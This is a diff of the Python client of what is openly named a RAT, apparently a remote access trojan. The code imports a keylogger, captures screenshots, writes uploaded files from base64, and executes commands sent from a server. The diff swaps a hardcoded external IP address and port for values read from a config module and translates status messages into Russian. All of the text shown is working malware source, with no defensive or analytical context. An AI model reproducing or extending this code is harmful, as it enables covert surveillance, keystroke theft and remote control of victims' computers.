@@ -1,4 +1,3 @@
-from cgi import test
 import socket
 import subprocess
 import time
@@ -11,8 +10,7 @@ import pyautogui
 import PIL
 import commands
 import key_logger
-
-__test = True
+import config
 
 
 class Client:
@@ -82,7 +80,7 @@ class Client:
         """Записывает файл с кодирование"""
         with open(path, "wb") as file:
             file.write(base64.b64decode(content))
-            return "[+] Upload complete"
+            return "Загрузка завершена"
     
     # Обработать изображение с экрана
     def screen_handler(self):
@@ -142,11 +140,11 @@ class Client:
             # Whole error handling, bad practice but required to keep connection
             except Exception as e:
                 command_response = (
-                    f"[-] Error running command: {e}"
+                    f"Ошибка выполнения команды: {e}"
                 )
             self.send_json(command_response)
 
 
 print("run")
-ratClient = Client("127.0.0.1", 8080) if test == True else Client("185.173.93.219", 9090)
+ratClient = Client(config.SERVER_IP, config.SERVER_PORT)
 ratClient.run()
